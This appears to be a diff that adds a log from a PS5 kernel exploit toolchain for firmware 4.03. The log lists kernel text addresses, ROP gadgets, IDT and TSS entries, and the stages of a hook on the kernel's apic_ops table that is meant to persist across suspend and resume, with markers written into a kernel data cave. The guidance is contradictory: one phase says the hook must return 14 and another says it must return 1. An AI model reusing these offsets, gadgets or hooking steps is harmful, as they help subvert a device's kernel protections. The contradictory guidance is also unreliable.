+    [16] 0xffffffff90ff8c78  (ktext+0x298c78)
+    [17] 0xffffffff90ff7db8  (ktext+0x297db8)
+    [18] 0xffffffff90ff7d50  (ktext+0x297d50)
+    [19] 0xffffffff90ff79c0  (ktext+0x2979c0)
+    [20] 0xffffffff90ff8048  (ktext+0x298048)
+    [21] 0xffffffff90ff7998  (ktext+0x297998)
+    [22] 0xffffffff90ff89d8  (ktext+0x2989d8)
+    [23] 0xffffffff90ff81f8  (ktext+0x2981f8)
+    [24] 0xffffffff90ff7560  (ktext+0x297560)
+    [25] 0xffffffff90ff7808  (ktext+0x297808)
+    [26] 0xffffffff90ff8160  (ktext+0x298160)
+    [27] 0xffffffff90ff80b0  (ktext+0x2980b0)
+
+[*] Sorted ktext addresses (inter-function gaps):
+    0xffffffff90ff71b0  gap: 272 bytes
+    0xffffffff90ff72c0  gap: 520 bytes
+    0xffffffff90ff74c8  gap: 152 bytes
+    0xffffffff90ff7560  gap: 504 bytes
+    0xffffffff90ff7758  gap: 0 bytes
+    0xffffffff90ff7758  gap: 176 bytes
+    0xffffffff90ff7808  gap: 256 bytes
+    0xffffffff90ff7908  gap: 144 bytes
+    0xffffffff90ff7998  gap: 40 bytes
+    0xffffffff90ff79c0  gap: 912 bytes
+    0xffffffff90ff7d50  gap: 104 bytes
+    0xffffffff90ff7db8  gap: 160 bytes
+    0xffffffff90ff7e58  gap: 208 bytes
+    0xffffffff90ff7f28  gap: 168 bytes
+    0xffffffff90ff7fd0  gap: 120 bytes
+    0xffffffff90ff8048  gap: 104 bytes
+    0xffffffff90ff80b0  gap: 176 bytes
+    0xffffffff90ff8160  gap: 128 bytes
+    0xffffffff90ff81e0  gap: 24 bytes
+    0xffffffff90ff81f8  gap: 120 bytes
+    0xffffffff90ff8270  gap: 1696 bytes
+    0xffffffff90ff8910  gap: 200 bytes
+    0xffffffff90ff89d8  gap: 128 bytes
+    0xffffffff90ff8a58  gap: 128 bytes
+    0xffffffff90ff8ad8  gap: 368 bytes
+    0xffffffff90ff8c48  gap: 48 bytes
+    0xffffffff90ff8c78  gap: 80 bytes
+    0xffffffff90ff8cc8  
+    Smallest gap: 0 bytes at 0xffffffff90ff7758
+
+=============================================
+  Phase 9: ktext Suspend Hook Preparation
+=============================================
+
+[*] Step 1: Call xapic_mode (ops[2]) to get actual return value...
+    xapic_mode 0xffffffff90ff7908 → ret=14 (0xe) errno=0
+    [!] Returns 14 — NOT 1!
+    Any hook must return 14 to match original behavior.
+    Previous 'mov eax,1;ret' gadget approach was WRONG.
+
+[*] Step 2: Testing known kstuff ktext offsets...
+    (Only verified entry points — no arbitrary probing)
+
+    nop_ret      ktext+0x22df36 → ret=-1850918608 errno=0
+
+[*] No kstuff offset returns 14 (xapic_mode value).
+    Using original xapic_mode as ktext hook target.
+    Will use P9_ARMED_MAGIC marker to verify persistence.
+
+[+] ============================================
+[+]  PHASE 9: KTEXT HOOK TARGET SELECTED
+[+] ============================================
+[+] Address: 0xffffffff90ff7908 (ktext+0x297908)
+[+] Target = original xapic_mode (using marker-based proof)
+[+] xapic_mode returns: 14 (hook must match this value)
+[+] This is in ktext → NPT allows execution during suspend!
+
+
+[+] *** POST-RESUME / MARKERS DETECTED ***
+
+[*] Cave marker (kdata_base):
+    Magic:       0x464c41545a484f4f — PERSISTED!
+    Saved xapic: 0xffffffff90ff7908
+    Saved ktext: 0xffffffff90d60000
+    KASLR: same slide (ktext_base matches)
+
+[*] Phase 9 armed marker (cave+0x20):
+    P9_ARMED_MAGIC: 0x5039484f4f4b4544 — PERSISTED!
+    Phase 9 ktext hook was armed before suspend.
+    System survived suspend/resume with our setup!
+
+[*] QA flags:
+    Bytes 0-1: ff ff — PERSISTED!
+
+[*] apic_ops[2] (xapic_mode):
+    Current value:  0xffffffff90ff7908
+    Original saved: 0xffffffff90ff7908
+    Minimal gadget: 0xffffffff91960150
+    → MATCH original — hook was restored or not armed.
+
+[+] ============================================
+[+]  POST-RESUME PERSISTENCE RESULTS
+[+] ============================================
+[+]   Cave marker:     PERSISTED
+[+]   QA flags:        PERSISTED
+[+]   apic_ops[2] now: 0xffffffff90ff7908
+[+]   Original xapic:  0xffffffff90ff7908
+[+]   apic_ops[2]:     RETAINED (original value)
+[*] Hook was either not armed or was restored.
+
+[*] Minimal gadget code (kdata+0x150): CORRUPTED
+    Got: 00 00 00 00 00 00
+[*] QA marker cleared.
+
+=============================================
+  Phase 8: kstuff Offsets + IDT Verification
+=============================================
+
+[*] ps5-kstuff offsets for FW 4.03 (relative to kdata_base):
+    kdata_base:      0xffffffff91960000
+    ktext_base:      0xffffffff90d60000
+
+    IDT:             0xffffffff97e2dc80  (kdata+0x64cdc80)
+    GDT array:       0xffffffff97e2ee30  (kdata+0x64cee30)
+    TSS array:       0xffffffff97e30830  (kdata+0x64d0830)
+    PCPU array:      0xffffffff97e32280  (kdata+0x64d2280)
+
+    doreti_iret:     0xffffffff90f907b4  (ktext+0x2307b4)
+    nop_ret:         0xffffffff90f8df36  (ktext+0x22df36)
+    justreturn:      0xffffffff90f90670  (ktext+0x230670)
+    Xinvtlb:         0xffffffff90ff4190  (ktext+0x294190)
+
+[*] Verifying IDT at kstuff offset...
+    IDT PA: 0x17e2dc80
+    IDT validated — entries 0, 13, 14 are valid gates.
+
+[*] IDT entries:
+    Vec   Name                  Handler             IST  Type DPL   ktext+offset
+    ───────────────────────────────────────────────────────────────────────
+      0   #DE div-by-zero       0xffffffff90ff4258  0    0xe   0     ktext+0x294258
+      1   #DB debug             0xffffffff90f907ad  7    0xe   0     ktext+0x2307ad
+      2   NMI                   0xffffffff90f907b4  2    0xe   0     ktext+0x2307b4
+      3   #BP breakpoint        0xffffffff90ff4178  0    0xe   3     ktext+0x294178
+      6   #UD invalid-op        0xffffffff90ff44b0  0    0xe   0     ktext+0x2944b0
+      8   #DF double-fault      0xffffffff90ff4180  1    0xe   0     ktext+0x294180
+     13   #GP general-prot      0xffffffff90f907ad  3    0xe   0     ktext+0x2307ad
+     14   #PF page-fault        0xffffffff90ff40d0  0    0xe   0     ktext+0x2940d0
+     18   #MC machine-chk       0xffffffff90ff4510  0    0xe   0     ktext+0x294510
+     32   IRQ0 timer            0xffffffff90ff4420  0    0xe   0     ktext+0x294420
+    128   int80 syscall         0xffffffff90ff4420  0    0xe   0     ktext+0x294420
+    244   Xinvtlb (int244)      0xffffffff90ff4190  0    0xe   0     ktext+0x294190
+
+    256 of 256 handlers in ktext range
+
+[*] Cross-verification:
+    Xinvtlb from IDT[244]: 0xffffffff90ff4190
+    Xinvtlb from kstuff:   0xffffffff90ff4190  [MATCH]
+    #GP handler (int 13):  0xffffffff90f907ad  IST=3
+
+[*] Verifying TSS at kstuff offset...
+    TSS PA: 0x17e30830
+    RSP0 (ring-0 stack): 0xffffff809ee17a40
+    TSS looks valid
+
+    IST entries (CPU 0):
+      IST1: 0xffffffff97e5a2f0
+      IST2: 0xffffffff97e5e2e0
+      IST3: 0xffffff8004dab050
+      IST4: 0xffff8133015a99f0
+      IST5: 0xffffffff97e662e0
+      IST6: 0xffff8133015a9c40
+      IST7: 0xffffff8004dab730
+
+[+] ============================================
+[+]  PHASE 8 SUMMARY
+[+] ============================================
+[+]  kstuff offsets loaded for FW 4.03
+[+]
+[+]  Key ktext gadgets (from kstuff):
+[+]    nop_ret (bare ret):  0xffffffff90f8df36
+[+]    doreti_iret:         0xffffffff90f907b4
+[+]    justreturn:          0xffffffff90f90670
+[+]
+[+]  nop_ret is a bare 'ret' in ktext (ROP gadget).
+[!]  WARNING: NOT safe for apic_ops[2] — bare ret returns
+[!]  garbage in eax.  xapic_mode MUST return 1 (xAPIC).
+[!]  Use 'mov eax, 1; ret' gadget instead.
+
+
+==============================================
+  All campaigns complete.
+==============================================
